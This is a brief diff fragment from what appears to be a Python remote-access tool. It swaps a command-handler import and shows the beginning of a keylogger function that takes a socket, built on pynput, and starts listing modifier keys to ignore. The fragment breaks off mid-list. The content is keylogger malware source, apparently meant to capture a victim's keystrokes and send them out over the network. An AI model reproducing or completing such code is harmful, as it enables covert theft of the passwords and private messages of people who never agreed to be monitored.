@@ -1,5 +1,5 @@
 from pynput import keyboard
-from windowscmdhandler import command_handler
+from external import command_handler
 
 def keylogger(sock):
     skipKeys = [keyboard.Key.ctrl,keyboard.Key.ctrl_l,keyboard.Key.ctrl_r,keyboard.Key.num_lock,keyboard.Key.alt,keyboard.Key.alt_l,keyboard.Key.alt_r,keyboard.Key.backspace,
